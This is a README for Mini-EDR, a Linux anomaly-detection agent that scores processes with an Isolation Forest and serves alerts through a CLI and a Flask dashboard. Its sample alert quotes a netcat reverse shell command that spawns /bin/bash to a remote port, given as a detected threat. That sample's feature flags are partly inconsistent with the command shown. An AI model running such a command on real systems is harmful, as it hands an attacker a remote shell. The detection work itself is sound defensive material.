# Mini-EDR

A lightweight Endpoint Detection and Response agent for Linux. It continuously monitors running processes, network connections, and system resource usage, then uses an **Isolation Forest** model to score each process for anomalous behaviour — flagging malware, reverse shells, cryptominers, obfuscated scripts, and similar threats.

---

## How it works

```
Collectors ──► Feature Engineering ──► Detector ──► Alerter
                                                        │
                                                   Dashboard (web UI)
```

### 1. Collectors (`collectors/`)

Three independent collectors gather a point-in-time snapshot using `psutil`:

| Collector | What it captures |
|---|---|
| `ProcessCollector` | All running processes: PID, name, exe path, cmdline, user, CPU%, RSS/VMS memory, open files, thread count |
| `NetworkCollector` | All active connections: local/remote addr+port, status, protocol family, owning PID |
| `ResourceCollector` | Host-level CPU (total + per-core), memory, and swap |

### 2. Feature engineering (`features/`)

`FeatureExtractor` joins the three collector outputs into a fixed **17-feature float32 vector** per process, ready for the ML model.

| Feature | Type | Description |
|---|---|---|
| `cpu_percent_log` | continuous | `log1p(cpu%)` — dampens outlier spikes |
| `memory_rss_log` | continuous | `log1p(RSS in MB)` |
| `num_threads` | continuous | Thread count |
| `open_files_count` | continuous | Number of open file handles |
| `num_fds` | continuous | Number of open file descriptors |
| `process_age_seconds_log` | continuous | `log1p(seconds since process start)` |
| `cmdline_length` | continuous | Total length of the command-line string |
| `is_unknown_name` | binary | Process name absent from the known-good whitelist |
| `exe_missing` | binary | Executable path no longer exists on disk (deleted-binary trick) |
| `cmdline_has_encoded` | binary | Command line contains a base64 or hex blob (≥ 40 chars) |
| `running_from_suspicious_path` | binary | Executable lives in `/tmp`, `/dev/shm`, `/var/tmp`, etc. |
| `num_connections` | continuous | Total network connections for this PID |
| `has_external_connection` | binary | At least one connection to a non-private IP |
| `is_listening` | binary | Process has an open listening socket |
| `rare_port` | binary | Remote port is outside the common port set |
| `cpu_ratio` | continuous | Process CPU% / host CPU% (clamped 0–1) |
| `mem_ratio` | continuous | Process RSS / host total memory (clamped 0–1) |

`KNOWN_PROCESS_NAMES` and `COMMON_PORTS` are the built-in defaults in `features/feature_extractor.py`. Both sets are fully editable at runtime via the dashboard or `config.json` without touching the source code.

### 3. Detector (`detector/`)

`IsolationForestDetector` wraps a `StandardScaler → IsolationForest` pipeline (scikit-learn).

- **Training**: fit once on a clean-state baseline. Scores are normalised to **[0, 1]** using the training min/max (higher = more anomalous).
- **Inference**: every process vector is scored; processes above `threshold` (default `0.8`) receive `is_anomaly = True`.
- **Persistence**: the fitted scaler + forest are saved/loaded with `joblib`.

### 4. Alerter (`alerter/`)

`Alerter` consumes flagged `DetectionResult` objects and emits structured alerts:

- **Stderr**: human-readable summary with a score bar and the top contributing features.
- **JSONL file**: one JSON object per alert, appended to `alerts.jsonl` (configurable).

Each alert includes `pid`, `name`, `exe`, `cmdline`, `anomaly_score`, `timestamp_utc`, and a `top_features` list that explains the most suspicious signals — binary flags (e.g. `exe_missing`) always appear first.

### 5. Dashboard (`dashboard/`)

A Flask web UI that wraps the full pipeline. It runs the monitor loop in a background thread and streams results to the browser via polling.

Key capabilities:
- **Start / Stop** the monitor without touching the terminal
- **Live alert feed** — colour-coded by score, with per-alert feature badges explaining why the process was flagged
- **Whitelist management** — add or remove known process names and common ports; changes take effect on the next collection cycle without restarting
- **Runtime settings** — override model path, threshold, polling interval, and log file path; all settings are persisted to `config.json`

---

## Installation

```bash
git clone <repo>
cd mini-edr
python -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

---

## Usage

There are two ways to run Mini-EDR: the **CLI** (`main.py`) for headless/scripted use, and the **web dashboard** (`dashboard.py`) for interactive monitoring.

### Step 1 — Train a baseline model

Run the agent in `train` mode while the system is in a known-clean state. It collects multiple snapshots and fits the model.

```bash
python main.py train
```

This collects 30 snapshots at 2-second intervals (~1 minute) and saves the model to `models/detector.joblib`.

**Options:**

```
--snapshots N        Number of collection snapshots  (default: 30)
--interval  SECS     Seconds between snapshots        (default: 2.0)
--threshold FLOAT    Alert threshold, 0–1             (default: 0.8)
--contamination F    Expected anomaly fraction        (default: 0.01)
--estimators N       IsolationForest trees            (default: 200)
--model PATH         Where to save the model          (default: models/detector.joblib)
```

For a more robust baseline, increase `--snapshots` and collect during representative workload:

```bash
python main.py train --snapshots 120 --interval 5 --model models/detector.joblib
```

### Step 2 — Run the monitor

```bash
python main.py run
```

Loads `models/detector.joblib` and polls every 5 seconds. Alerts are printed to stderr and appended to `alerts.jsonl`.

**Options:**

```
--model PATH         Saved model to load              (default: models/detector.joblib)
--interval SECS      Seconds between cycles           (default: 5.0)
--threshold FLOAT    Override saved threshold, 0–1    (default: use saved value)
--log PATH           JSONL alert log file             (default: alerts.jsonl)
--top-features N     Contributing features per alert  (default: 5)
--quiet              Suppress stderr output
--verbose            Print a status line every cycle
```

Disable the log file and print only to stderr:

```bash
python main.py run --log ''
```

Override the threshold without retraining:

```bash
python main.py run --threshold 0.75
```

### Step 3 — Web dashboard (alternative to CLI run)

```bash
python dashboard.py
```

Opens at `http://127.0.0.1:5000`. Options:

```
--host ADDR    Bind address  (default: 127.0.0.1)
--port PORT    Port          (default: 5000)
--debug        Enable Flask debug mode
```

#### Dashboard sections

**Monitor controls** (top-left panel)
Set the model path, threshold, polling interval, and log file, then click **Start**. The status badge updates live. Click **Stop** to halt the monitor at any time.

**Alert feed** (right panel)
Alerts appear automatically every 2 seconds. Each card shows the process name, PID, anomaly score with a visual bar, exe path, command line, and feature badges explaining the detection. Binary flags (`exe_missing`, `running_from_suspicious_path`, etc.) appear first in red; continuous features in blue.

**Known process names** (bottom-left)
Add or remove process names from the whitelist. Any process whose name is not in this list gets `is_unknown_name = 1` in its feature vector. Changes take effect on the next collection cycle.

**Common ports** (bottom-left)
Add or remove port numbers. Connections to ports not in this list get `rare_port = 1`. Changes are persisted to `config.json` automatically.

### Notes on privileges

`psutil.net_connections()` requires root (or `CAP_NET_ADMIN`) to see connections belonging to other users. Without it, the agent falls back to per-process queries and may miss some connections. Running as root gives the most complete picture:

```bash
# CLI
sudo venv/bin/python main.py run

# Dashboard
sudo venv/bin/python dashboard.py
```

---

## Alert output

### Stderr (human-readable)

```
[ALERT] 2026-04-02T10:23:11.042Z  pid=4821  name='nc'  score=0.941 █████████
        exe  : /tmp/nc
        cmd  : /tmp/nc -e /bin/bash 192.168.1.1 4444
        ├── exe_missing = 1.0  (executable no longer exists on disk (deleted binary))
        ├── running_from_suspicious_path = 1.0  (executable running from /tmp, /dev/shm, or similar)
        ├── has_external_connection = 1.0  (active connection to a public IP)
        ├── rare_port = 1.0  (remote port outside common port set)
        ├── cmdline_has_encoded = 1.0  (command line contains base64 or hex blob)
        json : {"alert_id": "2026-04-02T10:23:11.042Z_4821", ...}
```

### JSONL (machine-readable)

```json
{
  "alert_id": "2026-04-02T10:23:11.042Z_4821",
  "timestamp_utc": "2026-04-02T10:23:11.042Z",
  "pid": 4821,
  "name": "nc",
  "exe": "/tmp/nc",
  "cmdline": ["/tmp/nc", "-e", "/bin/bash", "192.168.1.1", "4444"],
  "anomaly_score": 0.941,
  "top_features": [
    {"feature": "exe_missing",               "value": 1.0, "reason": "executable no longer exists on disk (deleted binary)"},
    {"feature": "running_from_suspicious_path", "value": 1.0, "reason": "executable running from /tmp, /dev/shm, or similar"},
    {"feature": "has_external_connection",   "value": 1.0, "reason": "active connection to a public IP"},
    {"feature": "rare_port",                 "value": 1.0, "reason": "remote port outside common port set"},
    {"feature": "cmdline_has_encoded",       "value": 1.0, "reason": "command line contains base64 or hex blob"}
  ]
}
```

---

## Configuration file (`config.json`)

The dashboard persists all settings to `config.json` in the project root whenever a whitelist or setting is changed. This file is loaded automatically on the next dashboard start, so your customisations survive restarts.

```json
{
  "model_path": "models/detector.joblib",
  "threshold": 0.8,
  "interval": 5.0,
  "log_path": "alerts.jsonl",
  "known_names": ["bash", "python3", "..."],
  "common_ports": [80, 443, 22, "..."]
}
```

You can also edit this file directly; the dashboard reads it on startup.

---

## Running tests

```bash
# All tests
python -m pytest

# Per module
python -m pytest collectors/test_collectors.py -v
python -m pytest features/test_features.py -v
python -m pytest detector/test_detector.py -v
python -m pytest alerter/test_alerter.py -v
```

---

## Threshold tuning

The default threshold of `0.8` is a starting point. After your first training run, inspect the score distribution:

```python
from detector import IsolationForestDetector
from features import FeatureExtractor
from collectors import ProcessCollector, NetworkCollector, ResourceCollector

det = IsolationForestDetector.load("models/detector.joblib")
# collect a snapshot and score it
# examine the distribution of anomaly_score values
# pick a threshold that separates the long tail from the bulk
```

Typical approach: pick the threshold at the 95th–99th percentile of scores observed on a clean system, then monitor false-positive rate during the first few days of `run` mode and adjust with `--threshold`.
